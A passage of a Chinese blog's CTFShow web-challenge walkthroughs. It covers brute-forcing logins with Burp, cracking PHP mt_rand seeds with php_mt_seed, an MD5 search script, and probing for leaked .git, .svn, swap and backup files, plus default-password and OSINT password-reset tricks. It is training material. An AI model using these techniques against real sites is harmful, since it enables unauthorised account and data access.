    <content type="html"><![CDATA[<h2 id="Web21"><a href="#Web21" class="headerlink" title="Web21"></a>Web21</h2><p>随便输入抓包</p><p><img src="/posts/7ba9ac12/image-20220319165145359.png" alt="image-20220319165145359"></p><p>发现Base64加密</p><p><img src="/posts/7ba9ac12/image-20220319165235902.png" alt="image-20220319165235902"></p><p>账号和密码用:隔开</p><p>使用BP构造payload爆破</p><p><img src="/posts/7ba9ac12/image-20220319190509094.png" alt="image-20220319190509094"></p><p>下载官方提供的字典 把后缀名改为.zip即可打开</p><p><img src="/posts/7ba9ac12/image-20220319165739427.png" alt="image-20220319165739427"></p><p>使用Custom iterator模式</p><p><img src="/posts/7ba9ac12/image-20220319190606258.png" alt="image-20220319190606258"></p><p>第一部分</p><p><img src="/posts/7ba9ac12/image-20220319190709183.png" alt="image-20220319190709183"></p><p>第二部分</p><p><img src="/posts/7ba9ac12/image-20220319190752812.png" alt="image-20220319190752812"></p><p>第三部分使用字典</p><p><img src="/posts/7ba9ac12/image-20220319190821533.png" alt="image-20220319190821533"></p><p>添加base64加密</p><p><img src="/posts/7ba9ac12/image-20220319190843326.png" alt="image-20220319190843326"></p><p><img src="/posts/7ba9ac12/image-20220319170555561.png" alt="image-20220319170555561"></p><p>关闭url编码</p><p><img src="/posts/7ba9ac12/image-20220319190859899.png" alt="image-20220319190859899"></p><p>爆破完按length排序查看最小的回包</p><p><img src="/posts/7ba9ac12/image-20220319215305817.png" alt="image-20220319215305817"></p><p><img src="/posts/7ba9ac12/image-20220319200822331.png" alt="image-20220319200822331"></p><h2 id="Web22"><a href="#Web22" class="headerlink" title="Web22"></a>Web22</h2><p>子域名爆破，爆破ctf.show</p><p><img src="/posts/7ba9ac12/image-20220321152412725.png" alt="image-20220321152412725"></p><p>最终在vip.ctf.show的源码发现了flag</p><p><img src="/posts/7ba9ac12/image-20220321152516231.png" alt="image-20220321152516231"></p><h2 id="Web23"><a href="#Web23" class="headerlink" title="Web23"></a>Web23</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;token&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$token</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;token&#x27;</span>]);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$token</span>, <span class="hljs-number">1</span>,<span class="hljs-number">1</span>)===<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$token</span>, <span class="hljs-number">14</span>,<span class="hljs-number">1</span>) &amp;&amp; <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$token</span>, <span class="hljs-number">14</span>,<span class="hljs-number">1</span>) ===<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$token</span>, <span class="hljs-number">17</span>,<span class="hljs-number">1</span>))&#123;<br>        <span class="hljs-keyword">if</span>((<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$token</span>, <span class="hljs-number">1</span>,<span class="hljs-number">1</span>))+<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$token</span>, <span class="hljs-number">14</span>,<span class="hljs-number">1</span>))+<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$token</span>, <span class="hljs-number">17</span>,<span class="hljs-number">1</span>))/<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$token</span>, <span class="hljs-number">1</span>,<span class="hljs-number">1</span>)===<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$token</span>, <span class="hljs-number">31</span>,<span class="hljs-number">1</span>)))&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>这片代码主要的就是后面这两个if判断 我们需要构造一个符合条件的token</p><p>第一个条件:md5加密后的token第2，15，18位相等</p><p>第二个条件：第2，15，位与 18位&#x2F;2位的值 相加等于第32位</p><p>使用python脚本爆破</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><br>dic = <span class="hljs-string">&#x27;0123456789qazwsxedcrfvtgbyhnujmikolp&#x27;</span><br><span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> dic:<br>    <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> dic:<br>        t = <span class="hljs-built_in">str</span>(a) + <span class="hljs-built_in">str</span>(b)<br>        md5 = hashlib.md5(t.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)).hexdigest()<br>        <span class="hljs-keyword">if</span> md5[<span class="hljs-number">1</span>:<span class="hljs-number">2</span>] == md5[<span class="hljs-number">14</span>:<span class="hljs-number">15</span>] <span class="hljs-keyword">and</span> md5[<span class="hljs-number">14</span>:<span class="hljs-number">15</span>] == md5[<span class="hljs-number">17</span>:<span class="hljs-number">18</span>]:<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">int</span>(md5[<span class="hljs-number">1</span>:<span class="hljs-number">2</span>]) + <span class="hljs-built_in">int</span>(md5[<span class="hljs-number">14</span>:<span class="hljs-number">15</span>]) + <span class="hljs-built_in">int</span>(md5[<span class="hljs-number">17</span>:<span class="hljs-number">18</span>]) / <span class="hljs-built_in">int</span>(md5[<span class="hljs-number">1</span>:<span class="hljs-number">2</span>]) == <span class="hljs-built_in">int</span>(md5[<span class="hljs-number">31</span>:<span class="hljs-number">32</span>]):<br>                <span class="hljs-built_in">print</span>(t)<br></code></pre></td></tr></table></figure><p>得出结果是 3j</p><p><img src="/posts/7ba9ac12/image-20220321155828841.png" alt="image-20220321155828841"></p><p>拿到flag</p><h2 id="Web24"><a href="#Web24" class="headerlink" title="Web24"></a>Web24</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;r&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$r</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;r&#x27;</span>];<br>    <span class="hljs-title function_ invoke__">mt_srand</span>(<span class="hljs-number">372619038</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$r</span>)===<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-title function_ invoke__">mt_rand</span>()))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;cat /proc/version&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>my_srand()函数</p><blockquote><p>mt_srand() 播种 Mersenne Twister 随机数生成器。<br>mt_srand(seed)<br>seed 必需。用seed来给随机数发生器播种</p><p>mt_scrand(seed)这个函数的意思，是通过分发seed种子，然后种子有了后，靠mt_rand()生成随机 数。 提示：从 PHP 4.2.0 开始，随机数生成器自动播种，因此没有必要使用该函数 因此不需要播种，并且如果设置了 seed参数 生成的随机数就是伪随机数，意思就是每次生成的随机数 是一样的</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">mt_srand</span>(<span class="hljs-number">372619038</span>);<br><span class="hljs-keyword">echo</span>(<span class="hljs-title function_ invoke__">mt_rand</span>());<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>得到运行结果</p><p><img src="/posts/7ba9ac12/image-20220321163809287.png" alt="image-20220321163809287"></p><p>这里有个问题：不同的php版本得到的结果可能不一样 我使用的php版本得到的结果是 999695185但是在菜鸟在线运行工具中的得到的结果是上图 ，这道题的答案也是上图</p><p>已get方式通过r传参</p><p>得到flag</p><p><img src="/posts/7ba9ac12/image-20220321164027209.png" alt="image-20220321164027209"></p><h2 id="Web25"><a href="#Web25" class="headerlink" title="Web25"></a>Web25</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;r&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$r</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;r&#x27;</span>];<br>    <span class="hljs-title function_ invoke__">mt_srand</span>(<span class="hljs-title function_ invoke__">hexdec</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$flag</span>), <span class="hljs-number">0</span>,<span class="hljs-number">8</span>)));<br>    <span class="hljs-variable">$rand</span> = <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$r</span>)-<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-title function_ invoke__">mt_rand</span>());<br>    <span class="hljs-keyword">if</span>((!<span class="hljs-variable">$rand</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;token&#x27;</span>]==(<span class="hljs-title function_ invoke__">mt_rand</span>()+<span class="hljs-title function_ invoke__">mt_rand</span>()))&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$rand</span>;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;cat /proc/version&#x27;</span>);<br>&#125; <br></code></pre></td></tr></table></figure><blockquote><p><a href="https://www.openwall.com/php_mt_seed/">https://www.openwall.com/php_mt_seed/</a> </p><p><a href="https://www.cnblogs.com/zaqzzz/p/9997855.html">https://www.cnblogs.com/zaqzzz/p/9997855.html</a></p><p>mt_srand(seed)这个函数的意思，是通过分发seed种子，然后种子有了后，靠mt_rand()生成随机 数。 在之前自己还以为需要暴力破解cookie,最后师傅们给我介绍了一个脚本，专门用来跑mt_srand()种子和 mt_rand()随机数的 这里自己解释一下为什么每一次的mt_rand()+mt_rand()不是第一次的随机数相加？？ 因为生成的随机数可以说是一个线性变换（实际上非常复杂）的每一次的确定的但是每一次是不一样的，所以不能 进行第一次*2就得到mt_rand()+mt_rand() 使用说只要我们得到种子就可以在本地进行获得自己想要的值 </p><p>解题：通过随机数来寻找种子 我们让 ?r&#x3D;0 得到随机数。这里我得到的是 183607393 每一次不一样(因为flag值在变化) 然后下载 php_mt_seed4.0 我们在linux下面使用 gcc进行编译 gcc php_mt_seed.c -o php_mt_seed 之后运行脚本添加随机数 .&#x2F;php_mt_seed 183607393</p></blockquote><p>这道题先把flag的进行md5加密并取前8位然后进行16进制转10进制最后得到的值作为种子来生成随机数</p><p>通过cookie得到的token要等于两个随机数相加 （这个两个随机数并不相同）</p><p>同时我们可以通过?r&#x3D;0传参得到生成的随机数 因为如果r为零则回执行else语句输出随机数的负数</p><p><img src="/posts/7ba9ac12/image-20220322090313211.png" alt="image-20220322090313211"></p><p>这里我得到的随机数是585666240</p><p>接下来使用脚本得到可能的seed值</p><p>放到linux下编译</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">cd php_mt_seed-4.0 <br>gcc php_mt_seed.c -o php_mt_seed<br>/php_mt_seed 737212628<br></code></pre></td></tr></table></figure><p>接下来是漫长的等待</p><p><img src="/posts/7ba9ac12/image-20220322095150965.png" alt="image-20220322095150965"></p><p>通过响应头发现php的版本为7.3.11</p><p><img src="/posts/7ba9ac12/image-20220321231926792.png" alt="image-20220321231926792"></p><p>得到</p><p>接下来计算下两个随机数相加</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">mt_srand</span>(<span class="hljs-number">3842734643</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">mt_rand</span>().<span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">mt_rand</span>()+<span class="hljs-title function_ invoke__">mt_rand</span>().<span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>得到:</p><p>585666240<br>1350320544</p><p>接下来传参</p><p>通过get 传参?r&#x3D;585666240</p><p>抓包修改cookie  token&#x3D;1350320544</p><p>得到flag</p><p><img src="/posts/7ba9ac12/image-20220322095242899.png" alt="image-20220322095242899"></p><h2 id="Web26"><a href="#Web26" class="headerlink" title="Web26"></a>Web26</h2><p><img src="/posts/7ba9ac12/image-20220322143458709.png" alt="image-20220322143458709"></p><p>右键查看源代码发现javascript代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">check</span>(<span class="hljs-params"></span>)&#123;<br>$.<span class="hljs-title function_">ajax</span>(&#123;<br><span class="hljs-attr">url</span>:<span class="hljs-string">&#x27;checkdb.php&#x27;</span>,<br><span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;POST&#x27;</span>,<br><span class="hljs-attr">dataType</span>:<span class="hljs-string">&#x27;json&#x27;</span>,<br><span class="hljs-attr">data</span>:&#123;<br><span class="hljs-string">&#x27;a&#x27;</span>:$(<span class="hljs-string">&#x27;#a&#x27;</span>).<span class="hljs-title function_">val</span>(),<br><span class="hljs-string">&#x27;p&#x27;</span>:$(<span class="hljs-string">&#x27;#p&#x27;</span>).<span class="hljs-title function_">val</span>(),<br><span class="hljs-string">&#x27;d&#x27;</span>:$(<span class="hljs-string">&#x27;#d&#x27;</span>).<span class="hljs-title function_">val</span>(),<br><span class="hljs-string">&#x27;u&#x27;</span>:$(<span class="hljs-string">&#x27;#u&#x27;</span>).<span class="hljs-title function_">val</span>(),<br><span class="hljs-string">&#x27;pass&#x27;</span>:$(<span class="hljs-string">&#x27;#pass&#x27;</span>).<span class="hljs-title function_">val</span>()<br>&#125;,<br><span class="hljs-attr">success</span>:<span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>)&#123;<br><span class="hljs-title function_">alert</span>(data[<span class="hljs-string">&#x27;msg&#x27;</span>]);<br>&#125;,<br><span class="hljs-attr">error</span>:<span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>)&#123;<br><span class="hljs-title function_">alert</span>(data[<span class="hljs-string">&#x27;msg&#x27;</span>]);<br>&#125;<br><br>&#125;);<br>&#125;<br></code></pre></td></tr></table></figure><p>使用post提交返回一个json</p><p><img src="/posts/7ba9ac12/image-20220322144328975.png" alt="image-20220322144328975"></p><p>接下来对pass进行爆破</p><p><img src="/posts/7ba9ac12/image-20220322145311919.png" alt="image-20220322145311919"></p><p>密码为7758521</p><p>查看返回包</p><p><img src="/posts/7ba9ac12/image-20220322145407656.png" alt="image-20220322145407656"></p><p>得到flag</p><h2 id="Web27"><a href="#Web27" class="headerlink" title="Web27"></a>Web27</h2><p><img src="/posts/7ba9ac12/image-20220322150028820.png" alt="image-20220322150028820"></p><p>点击录取名单 得到一个表格</p><p><img src="/posts/7ba9ac12/image-20220322150556267.png" alt="image-20220322150556267"></p><p>可以看出来身份证哪里缺少了生日部分</p><p>点击进入学籍管理系统</p><p><img src="/posts/7ba9ac12/image-20220322150920971.png" alt="image-20220322150920971"></p><p>姓名 我们有了 身份证号缺少生日部分</p><p>抓包爆破 这里我用火狐抓的包有问题，换到chrome就好了</p><p><img src="/posts/7ba9ac12/image-20220322151658846.png" alt="image-20220322151658846"></p><p><img src="/posts/7ba9ac12/image-20220322151959622.png" alt="image-20220322151959622"></p><p><img src="/posts/7ba9ac12/image-20220322152050729.png" alt="image-20220322152050729"></p><p>得到出生日期 看回包</p><p>还以为是flag 没想到是unicode编码</p><p><img src="/posts/7ba9ac12/image-20220322152154775.png" alt="image-20220322152154775"></p><p><img src="/posts/7ba9ac12/image-20220322152401867.png" alt="image-20220322152401867"></p><p>登录 教务系统</p><p>拿到flag</p><p><img src="/posts/7ba9ac12/image-20220322152542559.png" alt="image-20220322152542559"></p><h2 id="Web28"><a href="#Web28" class="headerlink" title="Web28"></a>Web28</h2><p>where is flag?</p><p><img src="/posts/7ba9ac12/image-20220322153030411.png" alt="image-20220322153030411"></p><p><img src="/posts/7ba9ac12/image-20220322153115359.png" alt="image-20220322153115359"></p><p>看到url 的目录有点奇怪</p><p>继续抓包爆破</p><p><img src="/posts/7ba9ac12/image-20220322161517660.png" alt="image-20220322161517660"></p><p>第一，二位置配置一样</p><p><img src="/posts/7ba9ac12/image-20220322153553364.png" alt="image-20220322153553364"></p><p><img src="/posts/7ba9ac12/image-20220322161457124.png" alt="image-20220322161457124"></p><p>查看回包</p><p><img src="/posts/7ba9ac12/image-20220322161547231.png" alt="image-20220322161547231"></p><p>拿到flag</p>]]></content>
    
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTFShow Web入门_信息搜集</title>
    <link href="/posts/a805ee79/"/>
    <url>/posts/a805ee79/</url>
    
    <content type="html"><![CDATA[<h2 id="Web1"><a href="#Web1" class="headerlink" title="Web1"></a>Web1</h2><p><img src="/posts/a805ee79/image-20220314225911075.png" alt="image-20220314225911075"></p><p>右键查看源代码</p><p><img src="/posts/a805ee79/image-20220314225935080.png" alt="image-20220314225935080"></p><p>发现falg</p><h2 id="Web2"><a href="#Web2" class="headerlink" title="Web2"></a>Web2</h2><p><img src="/posts/a805ee79/image-20220314230516946.png" alt="image-20220314230516946"></p><p>发现无法右键</p><p>使用BP抓包刷新抓取数据包放到重放器发送数据包</p><p><img src="/posts/a805ee79/image-20220314230633907.png" alt="image-20220314230633907"></p><p>拿到flag</p><p>也可以使用火狐浏览器右上角菜单更多工具中的Web开发者工具</p><p><img src="/posts/a805ee79/image-20220314231209183.png" alt="image-20220314231209183"></p><p><img src="/posts/a805ee79/image-20220314231126090.png" alt="image-20220314231126090"></p><p><img src="/posts/a805ee79/image-20220314231233391.png" alt="image-20220314231233391"></p><h2 id="Web3"><a href="#Web3" class="headerlink" title="Web3"></a>Web3</h2><p><img src="/posts/a805ee79/image-20220314231700848.png" alt="image-20220314231700848"></p><p>老样子用BP抓包看下</p><p>返回包中发现flag</p><p><img src="/posts/a805ee79/image-20220314231738223.png" alt="image-20220314231738223"></p><h2 id="Web4"><a href="#Web4" class="headerlink" title="Web4"></a>Web4</h2><p>在url后加上&#x2F;robots.txt查看爬虫文件</p><p><img src="/posts/a805ee79/image-20220314232149792.png" alt="image-20220314232149792"></p><p>发现一个文件</p><p>访问</p><p><img src="/posts/a805ee79/image-20220314232215855.png" alt="image-20220314232215855"></p><p>出现flag</p><h2 id="Web5"><a href="#Web5" class="headerlink" title="Web5"></a>Web5</h2><p><img src="/posts/a805ee79/image-20220315171803308.png" alt="image-20220315171803308"></p><p>phps源代码泄露</p><p>访问index.phps</p><p><img src="/posts/a805ee79/image-20220315171853386.png" alt="image-20220315171853386"></p><p><img src="/posts/a805ee79/image-20220315171858003.png" alt="image-20220315171858003"></p><p><img src="/posts/a805ee79/image-20220315171942410.png" alt="image-20220315171942410"></p><p>拿到flag</p><h2 id="Web6"><a href="#Web6" class="headerlink" title="Web6"></a>Web6</h2><p>根据题目</p><p><img src="/posts/a805ee79/image-20220315190811938.png" alt="image-20220315190811938"></p><p>访问<a href="http://www.zip/">www.zip</a></p><p><img src="/posts/a805ee79/image-20220315190854205.png" alt="image-20220315190854205"></p><p><img src="/posts/a805ee79/image-20220315190907580.png" alt="image-20220315190907580"></p><p>拿到flag</p><p>提交</p><p><img src="/posts/a805ee79/image-20220315191209690.png" alt="image-20220315191209690"></p><p>是个假flag</p><p>看到题目说解压到了当前目录 直接访问fl000g.txt试下</p><p><img src="/posts/a805ee79/image-20220315191310368.png" alt="image-20220315191310368"></p><p>出现flag</p><h2 id="Web7"><a href="#Web7" class="headerlink" title="Web7"></a>Web7</h2><p><img src="/posts/a805ee79/image-20220315192327345.png" alt="image-20220315192327345"></p><p>git源码泄露</p><p>访问.git</p><p><img src="/posts/a805ee79/image-20220315192408795.png" alt="image-20220315192408795"></p><p>拿到flag</p><h2 id="Web8"><a href="#Web8" class="headerlink" title="Web8"></a>Web8</h2><p><img src="/posts/a805ee79/image-20220315192940618.png" alt="image-20220315192940618"></p><p>还是版本控制</p><p>除了git还有一个版本控制是svn</p><p>直接访问.svn</p><p><img src="/posts/a805ee79/image-20220315193042837.png" alt="image-20220315193042837"></p><p>拿到flag</p><h2 id="Web9"><a href="#Web9" class="headerlink" title="Web9"></a>Web9</h2><p><img src="/posts/a805ee79/image-20220315194812318.png" alt="image-20220315194812318"></p><p>这个题主要考察 vim的缓存泄露</p><blockquote><p>以 index.php 为例 </p><p>第一次产生的缓存文件名为 .index.php.swp<br>第二次意外退出后，文件名为.index.php.swo<br>第三次产生的缓存文件则为 .index.php.swn<br>注意：index前有 “ . “</p></blockquote><p>访问index.php.swp</p><p><img src="/posts/a805ee79/image-20220315195216485.png" alt="image-20220315195216485"></p><p><img src="/posts/a805ee79/image-20220315195242027.png" alt="image-20220315195242027"></p><p>拿到flag</p><h2 id="Web10"><a href="#Web10" class="headerlink" title="Web10"></a>Web10</h2><p><img src="/posts/a805ee79/image-20220315211938803.png" alt="image-20220315211938803"></p><p>F12打开开发者工具 打开网络抓包，查看cookie</p><p><img src="/posts/a805ee79/image-20220315212145315.png" alt="image-20220315212145315"></p><h2 id="Web11"><a href="#Web11" class="headerlink" title="Web11"></a>Web11</h2><p><img src="/posts/a805ee79/image-20220315212420525.png" alt="image-20220315212420525"></p><p>使用域名解析查看</p><p><a href="http://www.jsons.cn/nslookup/">http://www.jsons.cn/nslookup/</a></p><p><img src="/posts/a805ee79/image-20220315212610660.png" alt="image-20220315212610660"></p><h2 id="Web12"><a href="#Web12" class="headerlink" title="Web12"></a>Web12</h2><p><img src="/posts/a805ee79/image-20220315213126831.png" alt="image-20220315213126831"></p><p><img src="/posts/a805ee79/image-20220315213119215.png" alt="image-20220315213119215"></p><p>一个购物界面</p><p>页面最下面发现一串可以数字</p><p><img src="/posts/a805ee79/image-20220315213043070.png" alt="image-20220315213043070"></p><p>根据题目我们要进入到后台</p><p>看下robots.txt爬虫文件看下有什么目录</p><p><img src="/posts/a805ee79/image-20220315213223077.png" alt="image-20220315213223077"></p><p>发现一个admin目录</p><p><img src="/posts/a805ee79/image-20220315213247394.png" alt="image-20220315213247394"></p><p>用户名admin 密码就是上面那串数字</p><p><img src="/posts/a805ee79/image-20220315213334050.png" alt="image-20220315213334050"></p><p>拿到flag</p><h2 id="Web13"><a href="#Web13" class="headerlink" title="Web13"></a>Web13</h2><p><img src="/posts/a805ee79/image-20220315213423939.png" alt="image-20220315213423939"></p><p>页面最下面查看文档</p><p><img src="/posts/a805ee79/image-20220315213753195.png" alt="image-20220315213753195"></p><p><img src="/posts/a805ee79/image-20220315213826590.png" alt="image-20220315213826590"></p><p>发现目标</p><p>访问目录&#x2F;system1103&#x2F;login.php</p><p><img src="/posts/a805ee79/image-20220315213947106.png" alt="image-20220315213947106"></p><p>使用默认密码登录</p><p><img src="/posts/a805ee79/image-20220315214022669.png" alt="image-20220315214022669"></p><p>拿到flag</p><h2 id="Web14"><a href="#Web14" class="headerlink" title="Web14"></a>Web14</h2><p><img src="/posts/a805ee79/image-20220315214124007.png" alt="image-20220315214124007"></p><p>打开 链接像是某个app的官方界面</p><p>根据题目访问&#x2F;editor</p><p><img src="/posts/a805ee79/image-20220315215323992.png" alt="image-20220315215323992"></p><p>是一个编辑器，点击图片</p><p><img src="/posts/a805ee79/image-20220315215344782.png" alt="image-20220315215344782"></p><p>点击图片空间可以遍历服务器目录</p><p><img src="/posts/a805ee79/image-20220315215434205.png" alt="image-20220315215434205"></p><p>发现flag文件</p><p>接下来在url访问，直接在url后面加&#x2F;nothinghere&#x2F;fl000g.txt</p><p><img src="/posts/a805ee79/image-20220315215523391.png" alt="image-20220315215523391"></p><p>拿到flag</p><h2 id="Web15"><a href="#Web15" class="headerlink" title="Web15"></a>Web15</h2><p><img src="/posts/a805ee79/image-20220315215807585.png" alt="image-20220315215807585"></p><p><img src="/posts/a805ee79/image-20220315215953619.png" alt="image-20220315215953619"></p><p>打开页面最下面发现一个邮箱</p><p>url后面输入admin进入到后台</p><p>发现一个忘记密码的操作</p><p><img src="/posts/a805ee79/image-20220315220408424.png" alt="image-20220315220408424"></p><p>我们刚才得到一个邮箱 正好是qq邮箱可以通过qq信息查看城市</p><p><img src="/posts/a805ee79/image-20220315220733711.png" alt="image-20220315220733711"></p><p>在西安</p><p><img src="/posts/a805ee79/image-20220315220811268.png" alt="image-20220315220811268"></p><p>登录后台拿到flag</p><p><img src="/posts/a805ee79/image-20220315220903318.png" alt="image-20220315220903318"></p><h2 id="Web16"><a href="#Web16" class="headerlink" title="Web16"></a>Web16</h2><p><img src="/posts/a805ee79/image-20220315221153306.png" alt="image-20220315221153306"></p><p>在url后面添加tz.php</p><p><img src="/posts/a805ee79/image-20220315221807760.png" alt="image-20220315221807760"></p><p>进入探针页面查看phpinfor</p><p>搜索flag</p><p><img src="/posts/a805ee79/image-20220315221855292.png" alt="image-20220315221855292"></p><p>拿到flag</p><h2 id="Web17"><a href="#Web17" class="headerlink" title="Web17"></a>Web17</h2><p><img src="/posts/a805ee79/image-20220315222018553.png" alt="image-20220315222018553"></p><p>备份文件一般命名为backup访问backup.sql</p><p><img src="/posts/a805ee79/image-20220315222236426.png" alt="image-20220315222236426"></p><p><img src="/posts/a805ee79/image-20220315222251785.png" alt="image-20220315222251785"></p><p>拿到flag</p><h2 id="Web18"><a href="#Web18" class="headerlink" title="Web18"></a>Web18</h2><p><img src="/posts/a805ee79/image-20220315222502436.png" alt="image-20220315222502436"></p><p>使用开发者工具查看js文件</p><p><img src="/posts/a805ee79/image-20220315223020389.png" alt="image-20220315223020389"></p><p>解码看下</p><p><img 